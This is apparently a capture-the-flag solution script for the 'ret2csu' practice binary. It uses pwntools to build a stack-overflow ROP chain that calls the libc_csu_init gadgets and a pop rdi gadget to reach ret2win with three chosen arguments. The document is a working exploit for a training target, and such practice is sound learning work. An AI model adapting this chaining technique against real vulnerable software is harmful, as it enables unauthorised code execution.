from pwn import *

exe = context.binary = ELF('./ret2csu')

io = process('./ret2csu')

ret2win = p64(0x400510)
arg_one = p64(0xdeadbeefdeadbeef)
arg_two = p64(0xcafebabecafebabe)
arg_three = p64(0xd00df00dd00df00d)
first_gadget = p64(0x000000000040069a)
second_gadget = p64(0x0000000000400680)
pop_rdi = p64(0x00000000004006a3)
init = p64(0x600e38)   # x/10gx &_DYNAMIC

buf = b""
buf += b"A"*40
buf += first_gadget
buf += p64(0x0)   # we need rbx to be 0
buf += p64(0x1)   # set 0x1 to rbp
buf += init       # we need a valid func address because call dereferences it and then calls so cant put ret2win here
buf += arg_one
buf += arg_two
buf += arg_three

# Now move to second gadget
buf += second_gadget
buf += p64(0x0)  # add rsp,0x8
buf += p64(0x0)  # pop rbx
buf += p64(0x0)  # pop rbp
buf += p64(0x0)  # pop r12
buf += p64(0x0)  # pop r13
buf += p64(0x0)  # pop 14
buf += p64(0x0)  # pop r15
buf += pop_rdi   # This stuff is amazing, we can only control edi using gadget_two, so again need to put arg_one into rdi
buf += arg_one   # Before calling ret2win
buf += ret2win

io.sendline(buf)

io.interactive()
